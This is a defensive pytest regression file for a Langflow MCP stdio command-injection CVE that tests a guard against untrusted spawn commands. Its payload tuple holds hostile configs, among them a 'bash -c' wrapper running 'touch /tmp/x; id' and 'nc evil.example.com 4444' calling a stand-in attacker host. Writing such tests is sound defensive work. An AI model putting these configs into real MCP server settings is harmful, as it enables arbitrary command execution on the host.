"""CVE-2026-105697 — Langflow MCP stdio transport spawns an unvalidated command.

Vulnerability (from NVD and GHSA-w794-rj3p-xv45):
    Before Langflow 1.10.3, the MCP stdio transport launched whatever
    ``command`` / ``args`` a user put in an MCP server configuration, with no
    allowlist and wrapped in ``bash -c "exec {command} ..."``. Any user able to
    reach the MCP server settings (``POST/PATCH /api/v2/mcp/servers/{name}``) or
    to build a flow with the MCP Tools component could add a "server" whose
    command is an arbitrary OS command; it runs on the Langflow host as the
    Langflow process user the moment Langflow tries to connect — listing
    servers, loading tools or running the flow — even when the UI then reports
    that the stdio server failed to start. With the default
    ``LANGFLOW_AUTO_LOGIN=true`` this is reachable without an account. Fixed in
    Langflow 1.10.3 (langflow-base 0.10.3, lfx 1.10.3).

Advisory: https://github.com/langflow-ai/langflow/security/advisories/GHSA-w794-rj3p-xv45
NVD:      https://nvd.nist.gov/vuln/detail/CVE-2026-105697
CVSS:     9.9 (CRITICAL) — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H, CWE-78

Airlock fit: partial.
    This is the "both" case ``docs/cve-triage.md`` describes, and it splits the
    same way as CVE-2026-78575 (the earlier IBM Langflow stdio bulletin) and
    CVE-2026-79748 (MCPHub).

    **Out of scope: the settings endpoint.** That any user — or, with
    ``AUTO_LOGIN``, an anonymous one — may POST an MCP server at all is Langflow's
    own authorization. It is a missing check on an HTTP route that never calls
    into a decorated tool, and a contract layer for tool-call arguments cannot
    add auth to someone else's endpoint. Langflow 1.10.3 is where that belongs.

    **In scope: the spawn primitive.** The thing the missing check hands over is
    a caller-supplied stdio ``command`` / ``args`` heading for a shell spawn —
    the documented in-scope shape (``docs/cve-triage.md``, "Command / argument
    injection into a spawn", anchored on CVE-2026-42271), which
    ``McpSubprocessArgInjectionGuard`` already refuses deny-by-default. So this is
    a **second-defence regression fixture against an existing guard, not a new
    guard** — the CVE-2026-90898 / CVE-2026-57124 / CVE-2026-77521 pattern. The
    env-injection half disclosed as the sibling CVE-2026-105740 is covered in
    ``test_cve_2026_105740_langflow_stdio_env.py``.
"""

from __future__ import annotations

from typing import Any

import pytest
from scripts.cve_watcher import classify_shape

from agent_airlock.mcp_spec.subprocess_arg_guard import (
    McpSubprocessArgInjectionGuard,
    McpSubprocessArgVerdict,
)
from agent_airlock.policy_presets import mcp_subprocess_arg_injection_guard_defaults

CVE = "CVE-2026-105697"

#: NVD's description, verbatim, so the classifier assertions below are checked
#: against the real record rather than a paraphrase of it.
NVD_DESCRIPTION = (
    "Langflow is a tool for building and deploying AI-powered agents and workflows. Before "
    "Langflow 1.10.3, the MCP stdio transport launched whatever command / args a user put in "
    "an MCP server configuration, with no allowlist and (before 1.10.3) wrapped in bash -c "
    '"exec {command} ...". Any user able to reach the MCP server settings ("Settings → MCP '
    'Servers → Add MCP Server", POST/PATCH /api/v2/mcp/servers/{server_name}) or to build a '
    'flow with the MCP Tools component could add a "server" whose command is an arbitrary OS '
    "command (touch, rm -rf, a reverse shell, ...). The command runs on the Langflow host as "
    "the Langflow process user as soon as Langflow tries to connect to the server (listing "
    "servers, loading tools, running the flow) — even when the UI then reports that the stdio "
    "server failed to start. With the default LANGFLOW_AUTO_LOGIN=true, GET /api/v1/auto_login "
    "hands out a token without credentials, so on an exposed instance running the default "
    "configuration this is reachable without an account. AUTO_LOGIN is documented as a "
    "development-only setting; with it disabled, any authenticated (non-admin) user can exploit "
    "it. This issue is fixed in Langflow 1.10.3, langflow-base 0.10.3, and lfx 1.10.3."
)

#: NVD's only CWE. CWE-78 is argument-shaped, and it is what filed this.
NVD_CWES = ["CWE-78"]

#: The attacker-supplied stdio configs the bulletin describes: an arbitrary
#: program reaching ``bash -c "exec {command}"``. All three are deny-by-default
#: refusals because none of the programs is on an (empty) allowlist.
_SPAWN_PAYLOADS: tuple[tuple[str, dict[str, Any]], ...] = (
    # command is itself a shell string, which is what Langflow splices into bash -c.
    ("command_is_a_shell_string", {"command": "touch /tmp/x; id"}),
    # an explicit interpreter wrapper, the shape NVD spells as bash -c "exec {command}".
    ("bash_dash_c_wrapper", {"command": "/bin/bash", "args": ["-c", "touch /tmp/x; id"]}),
    # a bare launcher an operator never allowlisted.
    ("arbitrary_program", {"command": "nc", "args": ["evil.example.com", "4444"]}),
)

#: What a legitimate Langflow MCP stdio component looks like — the allow case an
#: operator-configured deployment would actually run.
_BENIGN: dict[str, Any] = {"command": "uvx", "args": ["mcp-server-git", "--repo", "/srv/repo"]}


class TestTheSpawnPrimitiveIsRefused:
    """The half of this CVE that reaches a tool-call argument."""

    @pytest.mark.parametrize(
        ("label", "config"), _SPAWN_PAYLOADS, ids=[p[0] for p in _SPAWN_PAYLOADS]
    )
    def test_each_spawn_shape_is_denied(self, label: str, config: dict[str, Any]) -> None:
        decision = McpSubprocessArgInjectionGuard().evaluate(config)
        assert decision.allowed is False, label
        assert decision.verdict is McpSubprocessArgVerdict.DENY_UNTRUSTED_COMMAND, label

    def test_a_configured_allowlist_still_admits_the_benign_launcher(self) -> None:
        """Deny-by-default means the allow case needs the allowlist set.

        With no allowlist the guard refuses everything, which is correct for a
        deny-by-default primitive but proves nothing about false positives. The
        operator-configured form is what a Langflow deployment would run.
        """
        guard = McpSubprocessArgInjectionGuard(allowed_commands=frozenset({"uvx"}))
        assert guard.evaluate(_BENIGN).verdict is McpSubprocessArgVerdict.ALLOW

    def test_an_allowlisted_launcher_does_not_rescue_an_arbitrary_program(self) -> None:
        """Allowlisting ``uvx`` does not admit ``bash`` — the program is resolved per call."""
        guard = McpSubprocessArgInjectionGuard(allowed_commands=frozenset({"uvx"}))
        decision = guard.evaluate(dict(_SPAWN_PAYLOADS[1][1]))
        assert decision.verdict is McpSubprocessArgVerdict.DENY_UNTRUSTED_COMMAND


class TestScopeBoundary:
    """Pin the half agent-airlock does **not** reach: the settings-endpoint authz."""

    def test_the_guard_cannot_tell_who_submitted_the_config(self) -> None:
        """Identical configs, different submitters, same verdict.

        The CVE is that *any* user, or with ``AUTO_LOGIN`` an anonymous one, may
        POST this at all. Who the caller is does not appear in the spawn config,
        so it is structurally invisible here — which is exactly why the fit above
        says *partial*. Langflow 1.10.3 owns the endpoint check.
        """
        guard = McpSubprocessArgInjectionGuard(allowed_commands=frozenset({"uvx"}))
        verdicts = {
            guard.evaluate(args).verdict
            for args in (
                _BENIGN,
                {**_BENIGN, "submitted_by": "anonymous-auto-login"},
                {**_BENIGN, "submitted_by": "admin"},
            )
        }
        assert verdicts == {McpSubprocessArgVerdict.ALLOW}

    def test_preset_does_not_claim_this_cve(self) -> None:
        # The preset claims the CVE it addresses (CVE-2026-42271). It does not
        # address Langflow's missing endpoint auth; it refuses the spawn config
        # that auth was supposed to keep out.
        preset = mcp_subprocess_arg_injection_guard_defaults()
        assert CVE not in str(preset.get("cves", ()))


class TestWatcherAdmittedThisOnTheCweSignal:
    """CWE-78 carried it; the full record also matches on the ``command`` / ``stdio`` sinks."""

    def test_it_is_a_candidate_on_the_full_record(self) -> None:
        assert classify_shape(NVD_DESCRIPTION, NVD_CWES) == "candidate"

    def test_the_argument_shaped_cwe_alone_files_it(self) -> None:
        assert classify_shape("", ["CWE-78"]) == "candidate"
